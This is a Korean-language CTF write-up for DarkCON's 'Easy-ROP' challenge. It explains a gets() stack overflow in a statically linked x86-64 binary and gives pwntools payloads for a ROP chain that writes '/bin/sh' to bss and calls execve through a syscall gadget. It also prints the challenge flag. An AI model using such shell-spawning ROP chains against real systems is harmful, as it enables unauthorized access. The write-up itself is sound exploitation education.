# [DarkCON CTF] Easy-ROP

## Info

+ 84 solves / 441 points

Welcome to the world of pwn!!! This should be a good entry level warmup challenge !! Enjoy getting the shell

## Summary

+ stack buffer overflow
+ ret2libc
+ ret2syscall

## File

+ Arch : x86-64
+ Library : statically linked

## Checksec

+ CANARY : Enabled
+ FORTIRY : Disabled
+ NX : Enabled
+ PIE : Disabled
+ RELRO : Partial

## Description

바이너리에서 유의미한 함수는 하나뿐이다.

+ main

gets()에 의해 스택 버퍼 오버플로우가 발생한다.

## Exploit

**ROPgadget**

```python
syscall = 0x004012d3
prax = 0x004175eb
prdi = 0x0040191a
prsi = 0x0040f4be
prdx = 0x0047560e
```

rdi, rdi, rdx, rax를 제어할 수 있고, syscall 가젯 또한 존재하므로 "/bin/sh" 문자열이 존재한다면 문제를 해결할 수 있다.

**Write binsh at bss**

```python
payload = b"A"*0x48
payload += p64(prdi)
payload += p64(bss)
payload += p64(gets)
p.sendline(payload)

payload = b"/bin/sh\x00"
p.sendline(payload)
```

ret2libc를 통해 gets() 함수를 호출해 bss 영역에 binsh 문자열을 작성해주자. 이제 binsh 문자열의 주소를 system의 인자로 전달해 줄 수 있다.

**Call system("/bin/sh") using syscall gadget**

```python
payload += p64(prdi)
payload += p64(bss)
payload += p64(prsi)
payload += p64(0)
payload += p64(prdx)
payload += p64(0) + p64(0) + p64(0)
payload += p64(prax)
payload += p64(0x3b)
payload += p64(syscall)
p.sendline(payload)
```

마지막으로 syscall과 binsh를 이용해 system("/bin/sh")를 호출하면 쉘을 취득할 수 있다.

## Flag

+ darkCON{w0nd3rful_m4k1n9_sh3llc0d3_us1n9_r0p!!!}